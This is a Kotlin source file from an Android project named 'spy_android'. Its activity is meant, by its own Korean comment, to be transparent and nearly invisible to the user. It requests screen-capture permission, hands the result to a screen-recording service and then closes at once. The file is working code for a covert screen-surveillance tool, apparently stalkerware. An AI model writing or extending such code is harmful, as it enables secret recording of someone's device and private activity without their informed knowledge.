package com.example.spy_android.activities

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.util.Log
import com.example.spy_android.services.ScreenRecordingService

class ScreenCaptureActivity : Activity() {

    companion object {
        private const val TAG = "ScreenCaptureActivity"
        private const val REQUEST_CODE_SCREEN_CAPTURE = 1000

        fun startScreenCapture(context: Context) {
            val intent = Intent(context, ScreenCaptureActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 투명한 액티비티로 사용자에게 거의 보이지 않음
        requestScreenCapturePermission()
    }

    private fun requestScreenCapturePermission() {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()

        startActivityForResult(captureIntent, REQUEST_CODE_SCREEN_CAPTURE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            REQUEST_CODE_SCREEN_CAPTURE -> {
                if (resultCode == RESULT_OK && data != null) {
                    // 화면 캡처 권한이 승인됨
                    startScreenRecordingService(resultCode, data)
                    Log.d(TAG, "화면 캡처 권한 승인됨")
                } else {
                    Log.d(TAG, "화면 캡처 권한 거부됨")
                }

                // 액티비티 종료
                finish()
            }
        }
    }

    private fun startScreenRecordingService(resultCode: Int, data: Intent) {
        val serviceIntent = Intent(this, ScreenRecordingService::class.java)
        serviceIntent.putExtra("resultCode", resultCode)
        serviceIntent.putExtra("data", data)

        startForegroundService(serviceIntent)
    }
}